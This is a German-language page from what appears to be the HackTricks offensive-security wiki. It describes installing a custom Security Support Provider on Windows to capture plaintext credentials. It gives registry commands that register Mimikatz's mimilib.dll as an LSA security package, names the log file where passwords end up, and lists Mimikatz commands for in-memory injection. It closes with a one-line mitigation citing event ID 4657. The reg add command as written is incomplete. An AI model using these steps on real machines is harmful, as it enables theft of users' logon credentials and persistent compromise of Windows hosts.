# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Erfahren Sie hier, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Sie können Ihr **eigenes SSP** erstellen, um **Kredentiale** im **Klartext** zu **erfassen**, die zum Zugriff auf die Maschine verwendet werden.

#### Mimilib

Sie können die von Mimikatz bereitgestellte `mimilib.dll`-Binärdatei verwenden. **Dies wird alle Kredentiale im Klartext in einer Datei protokollieren.**\
Legen Sie die dll in `C:\Windows\System32\` ab.\
Holen Sie sich eine Liste der vorhandenen LSA-Sicherheits-Pakete:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Fügen Sie `mimilib.dll` zur Liste der Sicherheitsunterstützungsanbieter (Sicherheits-Pakete) hinzu:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Und nach einem Neustart können alle Anmeldeinformationen im Klartext in `C:\Windows\System32\kiwissp.log` gefunden werden.

#### Im Speicher

Sie können dies auch direkt im Speicher mit Mimikatz injizieren (beachten Sie, dass es ein wenig instabil/nicht funktionieren könnte):
```bash
privilege::debug
misc::memssp
```
Das übersteht keine Neustarts.

#### Minderung

Ereignis-ID 4657 - Überwachung der Erstellung/Änderung von `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
